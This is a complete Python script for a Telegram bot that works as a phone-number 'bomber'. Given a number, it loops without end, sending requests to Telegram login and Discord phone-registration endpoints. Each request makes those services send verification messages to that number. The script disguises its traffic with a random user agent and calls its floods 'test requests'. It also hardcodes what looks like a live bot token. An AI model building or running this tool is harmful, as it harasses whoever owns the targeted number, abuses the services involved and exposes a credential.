# === Imports ===
import telebot
import requests
import fake_useragent
import threading
import time

# === Telegram Bot Setup ===
TOKEN = "8294178048:AAGu4hsFtyVrvw3T3ZiMWm8TjXT_qqiVNFc"   # <-- apna token dalna
bot = telebot.TeleBot(TOKEN)

# === Fake User Agent ===
user = fake_useragent.UserAgent().random
headers = {'user-agent': user}

# === User States (running / stop) ===
user_states = {}

# === Safe Request Functions ===
def safe_post(url, data=None):
    try:
        r = requests.post(url, headers=headers, data=data, timeout=5)
        return r.status_code == 200
    except:
        return False

def safe_get(url):
    try:
        r = requests.get(url, headers=headers, timeout=5)
        return r.status_code == 200
    except:
        return False

# === Bomber Function ===
def bomber(chat_id, number):
    count, success, fail = 0, 0, 0
    user_states[chat_id] = True   # running state ON

    while user_states.get(chat_id, False):
        # Sequence of APIs
        if safe_post('https://my.telegram.org/auth/send_password', data={'phone': number}): success += 1
        else: fail += 1

        if safe_get('https://telegram.org/support?setln=ru'): success += 1
        else: fail += 1

        if safe_post('https://my.telegram.org/auth/', data={'phone': number}): success += 1
        else: fail += 1

        if safe_post('https://my.telegram.org/auth/send_password', data={'phone': number}): success += 1
        else: fail += 1

        if safe_get('https://telegram.org/support?setln=ru'): success += 1
        else: fail += 1

        if safe_post('https://my.telegram.org/auth/', data={'phone': number}): success += 1
        else: fail += 1

        if safe_post('https://discord.com/api/v9/auth/register/phone', data={'phone': number}): success += 1
        else: fail += 1

        count += 1
        bot.send_message(chat_id, f"📩 Cycle {count} complete for {number}\n✅ Success: {success} | ❌ Fail: {fail}")
        time.sleep(2)

    bot.send_message(chat_id,
        f"🛑 Bomber stopped.\n\n📊 Final Report:\n"
        f"➡️ Total Cycles: {count}\n✅ Success: {success}\n❌ Fail: {fail}"
    )

# === /start Command ===
@bot.message_handler(commands=['start'])
def start(message):
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("❌ STOP")
    bot.send_message(message.chat.id,
        "👋 Welcome!\nSend me a phone number to start test requests.\n\nPress ❌ STOP anytime to stop.",
        reply_markup=markup
    )

# === STOP Command ===
@bot.message_handler(func=lambda m: m.text == "❌ STOP")
def stop_bomber(message):
    chat_id = message.chat.id
    user_states[chat_id] = False
    bot.send_message(chat_id, "⏳ Stopping bomber... please wait for summary.")

# === Phone Number Handler ===
@bot.message_handler(func=lambda m: m.text.isdigit())
def handle_number(message):
    number = message.text.strip()
    chat_id = message.chat.id

    # Start thread for bombing
    t = threading.Thread(target=bomber, args=(chat_id, number))
    t.start()

# === Start Polling ===
print("Bot is running...")
bot.polling()
